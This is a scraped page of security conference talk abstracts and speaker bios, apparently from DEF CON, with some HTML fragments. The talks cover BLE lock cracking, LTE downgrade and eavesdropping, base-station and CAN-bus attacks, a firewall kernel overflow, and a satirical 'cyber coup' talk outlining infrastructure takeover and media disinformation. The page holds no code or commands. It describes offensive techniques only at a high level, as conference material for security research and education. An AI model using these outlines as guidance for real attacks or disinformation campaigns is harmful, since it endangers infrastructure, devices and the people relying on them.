<p class="abstract">Direct from the mind of the guy who bought you the "I will kill you" presentation at DEF CON 23, is another mind bending, entertaining talk. This time it’s bigger and badder than before.<br><br> Are you sick and tired of your government? Can’t wait another 4 years for an election? Or do you want to be like the CIA and overthrow a government overseas for profit or fun? If you answered yes to one or more of these questions than this talk is for you! Why not create your own cyber mercenary unit and invoke a regime change to get the government you want installed? After all, if you want the job done right, sometimes you have to do it yourself. <br><br>Find out how over the last 60 years, governments and resource companies have been directly involved in architecting regime changes around world using clandestine mercenaries to ensure deniability. This has been achieved by destabilizing the ruling government, providing military equipment, assassinations, financing, training rebel groups and using government agencies like the CIA, Mossad and MI-5 or using foreign private mercenaries such as Executive Order and Sandline. Working with Simon Mann an elite ex SAS soldier turned coup architect who overthrew governments in Africa, Chris Rock will show you how mercenary coup tactics directly applied to digital mercenaries to cause regime changes as the next generation of "Cyber Dogs of War". <br><br>Chris will walk you through a cyber regime change from start to finish on a real country and show you how to architect a coup achieving the same result as a traditional mercenary operation without any blood spilt. This will include taking ownership of all facets of government including finance, telecommunications, transportation, commercial companies and critical infrastructure such a power, water and oil. You will learn:<br> • Traditional military mercenary coup tactics used by the infamous 32 Battalion in Africa, Executive Order and Sandline that can be directly applied to a cyber mercenary regime change.<br> • How to architect a cyber coup using advisor’s, hackers and the general populace, using misinformation, professional agitators, false information and financing.<br> • How to gather intelligence to analyze a government’s systemic weaknesses on financial, societal values and political climates that is leader or country specific to structure your attack.<br> • How to identify and prioritize government resources, infrastructure and commercial companies and how to use these compromised assets to stage the coup.<br> • Combine physical and digital techniques and have the best of both worlds to own a countries infrastructure.<br> • Hot to manipulate the media using propaganda targeting journalists flawed multiple "source" rules for a story.<br> • The Grand finale of a cyber regime change on a real country from beginning to end using the above techniques with operational footage. Come to this talk and find out how you too can be your own dictator, benevolent or merciless that part is up to you.</p>

</h3>

<p class="abstract">Many Bluetooth Low Energy (BLE) enabled deadbolts and padlocks have hit the market recently. These devices promise convenience and security through smartphone control. We investigated sixteen of these products from multiple vendors and discovered wireless vulnerabilities in most of them. Using a $50 antenna, we successfully picked vulnerable locks from over 400 meters away. In this presentation we introduce open source tools to crack each of the vulnerable BLE locks. Furthermore, after surveying the open source Bluetooth hacking tools currently available, we find very little support for BLE. So, to make discovering and range finding to BLE devices easier, we introduce a new open source war-walking tool compatible with both Bluetooth Classic and BLE.</p>

<p class="abstract">As introduced in our former series of talks &lsquo;LTE vs. Darwin&lsquo; there are quite a few of holes in the LTE specs. Now, having our own Macro BaseStation (an eNodeB) on the desk, we will demonstrate practical approaches to and attacks on real life devices. More and more devices are using mobile radio networks such as GSM, UMTS and LTE and there has already been quite a bit of research on (in)securities on the radio part, but only few people have had a look behind the scenes. Luckily, we had the chance to have just this look and now we would like to raise the curtain for the community. Initially we will quickly cover our complete odyssey from starting up an eNodeB for the first time, checking out the available interfaces and emulating the core network through to starting attacks. In the main part of the talk we will give a rather practical insight into the (in-)security features of basestations. We will start with valid backend connections and how these connections can be abused to reconfigure both a single eNodeB and a complete subnet on a telco network. We will then continue with the &lsquo;official&rsquo; maintenance approach with the vendor's tools and webinterfaces giving an attacker both local and remote access to the device. All in all the talk will cover general and specific vulnerabilities in both basestations and the backend network.</p>

<p class="abstract">LTE is a more advanced mobile network but not absolutely secure. Recently there already some papers those exposed the vulnerabilities of LTE network. In this presentation, we will introduce one method which jointly exploits the vulnerabilities in tracking area update procedure, attach procedure, and RRC redirection procedure, and finally can force a targeted LTE cellphone to downgrade into a malicious GSM network, then consequently can eavesdrop its data traffic or even voice call. This attack is not a simple DoS attack. It can select the targeted cellphone by filtering the IMSI number (IMSI catcher function), so it will not influence the other cellphones and keep them still in the real network. Further more, it can force the cellphone into the malicious network that we setup (a fake network) or we assign (operator’s network), therefore the cellphone has no chance to choose other secure network. This is the danger point of this attack.</p>

<p class="abstract">Last year, DARPA ran the qualifying event for the Cyber Grand Challenge to usher in the era of automated hacking. Shellphish, a rag-tag team of disorganized hackers mostly from UC Santa Barbara, decided to join the competition about ten minutes before the signups closed.<br><br> Characteristically, we proceeded to put everything off until the last minute, and spent 3 sleepless weeks preparing our Cyber Reasoning System for the contest. Our efforts paid off and, as we talked about last DEF CON , against all expectations, we qualified and became one of the 7 finalist teams. The finals of the CGC will be held the day before DEF CON. <br><br>If we win, this talk will be about how we won, or, in the overwhelmingly likely scenario of something going horribly wrong, this talk will be about butterflies. <br><br>In all seriousness, we've spent the last year working hard on building a really kickass Cyber Reasoning System, and there are tons of interesting aspects of it that we will talk about. Much of the process of building the CRS involved inventing new approaches to automated program analysis, exploitation, and patching. We'll talk about those, and try to convey how hackers new to the field can make their own innovations.<br><br> Other aspects of the CRS involved extreme amounts of engineering efforts to make sure that the system optimally used its computing power and was properly fault-tolerant. We'll talk about how automated hacking systems should be built to best handle this. Critically, our CRS needed to be able to adapt to the strategies of the systems fielded by the other competitors. We'll talk about the AI that we built to strategize throughout the game and decide what actions should be taken.<br><br> At the end of this talk, you will know how to go about building your own autonomous hacking system!

<p class="abstract">There has been much buzz about car hacking, but what about the larger heavy-duty brother, the big rig? Heavy trucks are increasingly networked, connected and susceptible to attack. Networks inside trucks frequently use Internet connected devices even on safety-critical networks where access to brakes and engine control is possible.

<h3 class="speaker">Shane Steiger, Esq. <span class="speakerTitle">CISSP, Chief Endpoint Security Architect</span></h3>

<p class="abstract">As a defender, have you ever been asked ‘do they win?’ How about ‘what products or capabilities should I buy to even the odds?’ Mapping the functionality to a standard list of desired capabilities only gets you so far. And, many vendors require an organization to pay for a framework, or for access to a framework, to enable tactical and strategic campaigns. Wouldn’t it be great to have an open source way to pick strategies? So what do you do? Build out your own defensive campaigns based on research, taxonomies and gameification. Building the attacker’s point of view is our expertise (at a CON). We have plenty of research here to talk about that point of view. How about building out the defender’s point of view based on the attacker’s life cycle? Defenders can use this as a defensive ‘compliment’ to begin a legitimate defensive campaign. Maybe the defender could even ‘gamify’ the approach? An attacker’s approach, a defender’s approach and a progressive life cycle with a defender’s set of targets built on things we all know, love and hate: project management. I think we have a game! <br><br>Build out rules, much like real life, then bring on the attackers, bring on the defenders and play a little game to educate, demonstrate and evangelize. Watch strategies played by both attackers and defenders. Switch sides and learn to be a Purple Teamer! Digitize it and watch the game play people or even play itself; the true rise of the machine.<br><br> Wanna Play?!</p>

<h3 class="speaker">Tamas Szakaly <span class="speakerTitle">Lead Security Researcher, PR-Audit Ltd., Hungary</span></h3>

<p class="abstract">As stated in my bio, besides computer security I also love fligh simulators and mountain biking. Last year I gave a talk about hacking a flight simulator (among other games), it was only fitting to research something related to my other hobby too. Old day's bike speedometers have evolved quite a bit, and nowadays a lot of bikers (swimmers, runners, ers) do their sport with tiny computers attached to them. These computers do much more than measuring speed: they have GPS, they can store your activities, can be your training buddy, and they can communicate with various sensors (cadence, power meter, heart rate monitors, you name it), mobile phones, each other, and with PCs. One of the communication protocols used by these devices is ANT. Never heard of it? Not surprising, it is not very well known despite being utilized by a lot of gadgets including, but not limited to sport watches, mobile phones, weight scales, some medical devices, and even bicycle lights and radars. When I bought my first bike computer I rationalized it with thoughts like &lsquo;this will help me navigate on the mountain&rsquo;, or &lsquo;I can track how much I've developed&rsquo;, but deep down I knew the real reason was my curiosity about this lesser known, lesser researched protocol. <br><br>One of my favorite kind of weaknesses are the ones caused by questionable design decisions, and can be spotted without actual hands-on experience with the product itself, just by reading the documentation. Well this is exactly what happened here, I had some attack vectors ready and waiting well before I received the actual device. To top it all, I've also found some implementation bugs after getting my hands on various Garmin devices. <br><br>After a brief introduction to the ANT, ANT+ and ANT-FS protocols, I'll explain and demo both the implementation and the protocol weaknesses and reach the already suspected conclusion that ANT and the devices that use it are absolutely insecure: anybody can access your information, turn off your bike light, or even replace the firmware on your sport watch over the air. </p>

<p class="abstract">Dismissing or laughing off concerns about what it does to a person to know critical secrets does not lessen the impact when those secrets build a different map of reality than "normals" use and one has to calibrate narratives to what another believes. The cognitive dissonance that inevitably causes is managed by some with denial who live as if refusing to feel the pain makes it disappear. But as Philip K. Dick said, reality is that which, when you no longer believe in it, refuses to go away. And when cognitive dissonance evolves into symptoms of traumatic stress, one ignores those symptoms at one's peril. But the constraints of one's work often make it impossible to speak aloud about those symptoms, because that might threaten one's clearances, work, and career. The real cost of security work and professional intelligence goes beyond dollars. It is measured in family life, relationships, and mental and physical well-being. <br><br>The divorce rate is as high among intelligence professionals as it is among medical professionals, for good reason - how can relationships be based on openness and trust when one's primary commitments make truth-telling and disclosure impossible?<br><br> Richard Thieme has been around that space for years. He has listened to people in pain because of the compelling necessities of their work, the consequences of their actions, the misfiring of imperfect plans, and the burdens of - for example - listening to terrorists slit someone's throat in real time, then having to act as if they had a normal day at the office. Thieme touched on some of this impact in his story, "Northward into the Night," published in the Ranfurly Review, Big City Lit, Wanderings and Bewildering Stories before collection in "Mind Games." The story illuminates the emotional toll of managing multiple personas and ultimately forgetting who you are in the first place. <br><br>The bottom line is, trauma and secondary trauma have identifiable symptoms and they are everywhere in the "industry." The "hyper-real" space which the national security state creates by its very nature extends to normals, too, now, but it's more intense for professionals. Living as "social engineers," always trying to understand the other's POV so one can manipulate and exploit it, erodes the core self. The challenge is not abstract or philosophical, it's existential, fired into our faces every day at point blank range, and it constitutes an assault on authenticity and integrity. Sometimes sanity is at stake, too, and sometimes, life itself. In one week, two different people linked to the CIA told Thieme that going into that agency was like becoming a scientologist. Think about what that analogy means. For his own sake and sanity, Thieme has thought about it a lot and that's what this talk is about - the real facts of the matter and strategies for effective life-serving responses. </p>

<p class="speakerBio"><strong>Richard Thieme</strong> is an author and professional speaker focused on the challenges posed by new technologies and the future, how to redesign ourselves to meet these challenges, and creativity in response to radical change. His column, &lsquo;Islands in the Clickstream,&rsquo; was distributed to subscribers in sixty countries before collection as a book in 2004. When a friend at the National Security Agency said after they worked together on ethics and intelligence issues, &lsquo;The only way you can tell the truth is through fiction,&rsquo; he returned to writing short stories, 19 of which are collected in "Mind Games." <br><br>His latest work is the stunning novel "FOAM," published by Exurban Press September 2015. He is also co-author of the critically extolled "UFOs and Government: A Historical Inquiry," a 5-year research project using material exclusively from government documents and other primary sources, now in 65 university libraries His work has been taught at universities in Europe, Australia, Canada, and the United States, and he has guest lectured at numerous universities, including Purdue University (CERIAS), the Technology, Literacy and Culture Distinguished Speakers Series of the University of Texas, the "Design Matters" lecture series at the University of Calgary, and as a Distinguished Lecturer in Telecommunications Systems at Murray State University. <br><br>He addressed the reinvention of "Europe" as a "cognitive artifact" for curators and artists at Museum Sztuki in Lodz, Poland, keynoted CONFidence in Krakow 2015, and keynoted "The Real Truth: A World’s Fair" at Raven Row Gallery, London, He recently keynoted Code Blue in Tokyo.

<p class="abstract"> The CAN bus is really mainstream, and every now and then there are new tools coming out to deal with it. Everyone wants to control vehicles and already knows that you can make the horn honk by replaying that frame you captured. But is this all that there is on this topic? Reversing OEM and third party tools, capturing firmware update files on the fly, and hijacking Security Sessions on a bus are just a few examples of things that can be done as well. For this and more, we will introduce to you the CanBadger! It's not just a logger, neither an injector. It's a reversing tool for vehicles that allows you to interact in realtime with individual components, scan a bus using several protocols (yup, UDS is not the only one) and perform a series of tests that no other tool offers. The CanBadger is where the real fun begins when dealing with a vehicle, and you can build it under $60USD! If you are already done with replaying frames on the CAN bus and want to learn how that fancy chip-tuning tool deals with your car, or simply want to get Security Access to your vehicle without caring about the security key or algorithm, we are waiting for you! </p>

<h2 class="talkTitle">Frontrunning the Frontrunners</h2>
<h3 class="speaker">Dr. Paul Vixie<span class="speakerTitle">CEO and Co-founder, Farsight Security, Inc.</span></h3>

<p class="abstract">-While some domainers allegedly brainstorm ideas for new domains to register while taking a shower, the more successful domain portfolio managers, working at scale, are believed to be &lsquo;data driven.&rsquo; DNS queries are a material source of intelligence about domainer opportunities and operations, and also help us to understand the operational constraints around potentially combating domainers, should we want to do so. In this presentation co-authored with Farsight Security Scientist Dr. Joe St Sauver, Farsight Security CEO Dr. Paul Vixie will scrutinize failed DNS queries (&lsquo;NXDOMAINs&rsquo;), looking for the same &lsquo;opportunities&rsquo; that a domainer or typo squatter would (although we will not be acting on that data by actually registering domains). <br><br>Dr. Vixie will discuss two primary types of behavior: 1) Volumetrically-driven typo-squatting, which Dr. Vixie will measure by computing the volume of NXDOMAINs seen by domain during a 24 hour period, and the time between popular typos appearing in NXDOMAINs and those same domains being registered and actually used, and 2) Domainers programmatically exploring permutations of domains around high value domains, probing for available domains and automatically registering the most promising probed domains discovered to still be available. Both of these hypothesized behaviors should be externally observable and thus able to be confirmed by watching a real-time stream of NXDOMAIN errors, and a real-time stream of newly observed, actually-registered domains, as available from the Security Information Exchange.<br><br> Dr. Paul Vixie will experimentally confirm these hypothesized relationships and describe examples of (1) the most commonly observed types of typographical errors, (2) the brands apparently most-targeted for squatting, (3) the distribution of delays from NXDOMAIN detection to observed domain use, (4) the potential relationship between NXDOMAIN volume thresholds and TLD cost. Dr. Vixie will also explain how this information illuminates opportunities for tackling these types of domain name abuse. Time will be reserved for Q&amp;A. </p>

<p class="speakerBio"><strong>Dr. Paul Vixie</strong> is the CEO and Co-founder of Farsight Security. He previously served as President, Chairman and Founder of Internet Systems Consortium (ISC), as President of MAPS, PAIX and MIBH, as CTO of Abovenet/MFN, and on the boards of several for-profit and non-profit companies. He served on the ARIN Board of Trustees from 2005 to 2013, as ARIN Chairman in 2008 and 2009, and was a founding member of ICANN Root Server System Advisory Committee (RSSAC) and ICANN Security and Stability Advisory Committee (SSAC). He operated the ISC's F-Root name server for many years, and is a member of Cogent's C-Root team. He is a sysadmin for Op-Sec-Trust.

<h3 class="speaker">Patrick Wardle <span class="speakerTitle">Director of Research, Synack</span></h3>

<p class="abstract">Security products should make our computers more secure, not less.  Little Snitch is the de facto personal firewall for OS X that aims to secure a Mac by blocking unauthorized network traffic. Unfortunately bypassing this firewall's network monitoring mechanisms is trivial...and worse yet, the firewall's kernel core was found to contain an exploitable ring-0 heap-overflow. #fail Though briefly touching on generic firewall bypass techniques, this talk will largely focus on the kernel-mode vulnerability. Specifically, I’ll discuss bypassing OS X specific anti-debugging mechanisms employed by the product, reverse-engineering the firewall's I/O Kit kernel interfaces and 'authentication' mechanisms, and the discovery of the exploitable heap-overflow. <br><br>

Finally, methods of exploitation will be briefly discussed, including how an Apple kernel-fix made this previously un-exploitable bug, exploitable on OS X 10.11<br><br>
So if you simply want to see yet another 'security' product fall, or more generically, learn methods of OS X kernel extension reversing in a practical manner, then this talk is for you :) </p>

<p class="abstract">Much of the time and attention dedicated to modern network security focuses on detecting the contemporary vulnerabilities and exploits which power the breaches that make the headlines. With almost all of the emphasis is placed around the endless cycle of new entry points, we are often overlooking what is perhaps one of the most profoundly interesting aspects of modern network breaches; the post-exploit communication of a compromised system to the attacker—known as command and control. <br><br>Once malware has compromised an end system, the tables are turned against the attackers; we go from being on defense, to being on offense. Attackers are constantly evolving their techniques and have become incredibly creative in attempting to hide their tracks, maintain control of compromised systems, and exfiltrate sensitive data. This presentation will explore how command and control channels have evolved against traditional defenses, where they are today, future predictions on their evolution, and most importantly, how you can go on the offense to protect your organization by identifying and disrupting command and control channels in your network.</p>

<p class="abstract">As bandwidth, computing power, and software advancements have improved over the years, we've begun to see larger and larger DDoS attacks against organizations. Often times these attacks employ techniques such as DNS Amplification to take advantage of servers with very large uplinks. This talk explores a similar technique targeting commonly used throughput testing software typically running on very large uplinks. We will explore the process of attacking this software, eventually compromising it and gaining root access. Then we'll explore some of these servers in the real world determining the size of their uplinks and calculating the total available bandwidth at our fingertips all from a $5 VPS.

Bryant Zadegan <span class="speakerTitle"> Application Security Advisor &amp; Mentor, Mach37</span><br>
Ryan Lester <span class="speakerTitle">CEO &amp; Chief Software Architect, Cyph</span></h3>

<p class="abstract">Through cooperation between browser vendors and standards bodies in the recent past, numerous standards have been created to enforce stronger client-side control for web applications. As web appsec practitioners continue to shift from mitigating vulnerabilities to implementing proactive controls, each new standard adds another layer of defense for attack patterns previously accepted as risks. With the most basic controls complete, attention is shifting toward mitigating more complex threats. As a result of the drive to control for these threats client-side, standards such as SubResource Integrity (SRI), Content Security Policy (CSP), and HTTP Public Key Pinning (HPKP) carry larger implementation risks than others such as HTTP Strict Transport Security (HSTS). Builders supporting legacy applications actively make trade-offs between implementing the latest standards versus accepting risks simply because of the increased risks newer web standards pose. In this talk, we'll strictly explore the risks posed by SRI, CSP, and HPKP; demonstrate effective mitigation strategies and compromises which may make these standards more accessible to builders and defenders supporting legacy applications; as well as examine emergent properties of standards such as HPKP to cover previously unforeseen scenarios. As a bonus for the breakers, we'll explore and demonstrate exploitations of the emergent risks in these more volatile standards, to include multiple vulnerabilities uncovered quite literally during our research for this talk (which will hopefully be mitigated by d-day). </p>

Mudge Zatko <span class="speakerTitle">Director, CITL</span><br>
Sarah Zatko <span class="speakerTitle">CHief Scientist, CITL</span>

</h3>

<p class="abstract">Many industries, provide consumers with data about the quality, content, and cost of ownership of products, but the software industry leaves consumers with very little data to act upon. In fact when it comes to how secure or weak a product is from a security perspective, there is no meaningful consumer facing data. There has long been a call for the establishment of an independent organization to address this need. Last year, Mudge (from DARPA, Google, and L0pht fame) announced that after receiving a phone call from the White House he was leaving his senior position inside Google to create a non-profit organization to address this issue. This effort, known as CITL, is akin to Consumer Reports in its methodologies. While the media has dubbed it a "CyberUL", there is no focus on certifications or seals of approval, and no opaque evaluation metrics. Rather, like Consumer Reports, the goal is to evaluate software according to metrics and measurements that allow quantitative comparison and evaluation by anyone from a layperson, CFO, to security expert. <br><br>How? A wide range of heuristics that attackers use to identify which targets are hard or soft against new exploitation has been codified, refined, and enhanced. Some of these techniques are quite straightforward and even broadly known, while others are esoteric tradecraft. To date, no one has applied all of these metrics uniformly across an entire software ecosystem before and shared the results. <br><br>For the first time, a peek at the Cyber Independent Testing Lab’s metrics, methodologies, and preliminary results from assessing the software quality and inherent vulnerability in over 100,000 binary applications on Windows, Linux, and OS X will be revealed. All accomplished with binaries only. Sometimes the more secure product is actually the cheaper, and quite often the security product is the most vulnerable.<br><br> There are plenty of surprises like these that are finally revealed through quantified measurements. With this information, organizations and consumers can finally make informed purchasing decisions when it comes the security of their products, and measurably realize more hardened environments. Insurance groups are already engaging CITL, as are organizations focused on consumer safety. Vendors will see how much better or worse their products are in comparison to their competitors. Even exploit developers have demonstrated that these results enable bug-bounty arbitrage. That recommendation you made to your family members last holiday about which web browser they should use to stay safe (or that large purchase you made for your industrial control systems)? Well, you can finally see if you chose a hard or soft target… with the data to back it up. </p>

<p class="speakerBio">

<strong>Mudge Zatko</strong> is the Director of CITL. He has contributed significantly to disclosure and education on information and security vulnerabilities. In addition to pioneering buffer overflow work, the security work he has released contained early examples of flaws in the following areas: code injection, race conditions, side-channel attacks, exploitation of embedded systems, and cryptanalysis of commercial systems. He was the original author of the password cracking software L0phtCrack, Anti-Sniff, and L0phtWatch. In 2010 Mudge accepted a position as a program manager at DARPA where he oversaw cyber security R&D, and re-built the Agency’s approach to cyber security research. In 2013 Mudge went to work for Google where he was the Deputy Director of their Advanced Technology &amp; Projects division. Most recently, after conversations with the White House, Mudge stood up the non-profit Cyber Independent Testing Laboratory inspired by efforts such as Consumer’s Union. He is the recipient of the Secretary of Defense Exceptional Civilian Service Award medal, an honorary Plank Owner of the US Navy Destroyer DDG-85, was inducted into the Order of Thor, the US Army’s Association of Cyber Military Professionals, recognized as a vital contributor to the creation of the US Cyber Corps (SfS PDD-63), and has received other commendations from the CIA and from the Executive Office of the President of the United States<br><br>

<p class="abstract">We are releasing a new tool for discovering bluetooth devices and automatically probing them for information. Effectively we have created a new tool with an airodump-ng like display for nearby bluetooth and bluetooth low energy devices. We will discuss the challenges with finding bluetooth devices, as well as how we have overcome them using both standard bluetooth adapters and optionally ubertooth hardware. If you have ever wondered why no one released an effective tool to see all the bluetooth in the area then come by, learn a little, and leave with a tool you have always wanted. Blue Hydra will discover and track bluetooth and bluetooth low energy devices in the area, regardless of being in discoverable mode, and tracks data (bluetooth version, services, etc) as well as meta-data (signal strength, timestamps) over time. We will be going over how bluetooth operates on a high level, and how we were able to discover and track nearby devices. A deep understanding of the bluetooth protocol was not needed to develop Blue Hydra (we stood on the shoulders of giants) and will not be required to use Blue Hydra or understand it's output.</p>

<p class="abstract">Modern web applications generate a ton of logs. Suites like ELK (Elasticsearch, Logstash, Kibana) exist to help manage these logs, and more people are turning to them for their log analysis needs. These logs contain a treasure trove of information regarding bad actors on your site, but surfacing that information in a timely manner can be difficult. When Etsy moved over from Splunk to ELK in mid-2014, we realized that ELK lacked necessary functionality for real-time alerting. We needed a solution that would provide a robust means of querying ELK and enrich the data with additional context. We ended up creating our own framework to give us this functionality. We’ve named this open-source framework 411. We designed 411 as a solution for detecting and alerting on interesting anomalies and security events. The Security team at Etsy was interested in using this functionality to detect everything from XSS to monitoring for potential account compromises. First, we’ll start off with a discussion of what you should be logging into Elasticsearch. This is important to help you create useful, actionable alerts in 411. We’ll note a number of configuration tips and tricks to help you get the most out of your ELK cluster. From there, we’ll dive into 411’s features and how it allows the Etsy security team to work effectively. We’ll conclude with two demos of 411 in action. This presentation will show you several examples of useful searches you can build in 411 and how this data can be manipulated to generate clear, actionable alerts. We’ll demonstrate the built-in workflow for responding to alerts and how 411 allows you to pull up additional context as you work on an alert. Additionally, while much of our discussion will be centered around ELK, 411 can in fact be used with a variety of data sources (Several of these sources are built into 411). Whether you’re a newbie looking to learn more or a security veteran with an established system, 411 will help change the way you handle security alerts.</p>
